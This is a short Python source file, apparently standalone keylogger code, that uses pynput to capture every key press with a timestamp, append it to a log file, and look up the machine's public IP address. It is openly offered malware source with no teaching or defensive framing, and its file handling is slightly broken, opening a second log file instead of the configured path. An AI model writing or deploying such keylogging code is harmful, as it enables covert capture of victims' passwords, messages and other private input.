from pynput.keyboard import Listener
import time
import requests


class Keylogger:

    def __init__(self):
        self.start_time = time.time()
        self.ip = requests.request('GET', 'https://api.ipify.org').text
        self.logFile = "output/keylogs.txt"

    def keystroke_handler(self, key):
        dateTime = time.strftime("%m/%d/%Y %H:%M:%S")
        format = f'{dateTime}: {key}\n'
        with open(f"{self.logFile}", "a") as keylogFile:
            keylogFile = open("keylogs.txt", "a")
            keylogFile.write(format)

    def main(self):
        with Listener(on_press=Keylogger().keystroke_handler) as listener:
            listener.join()
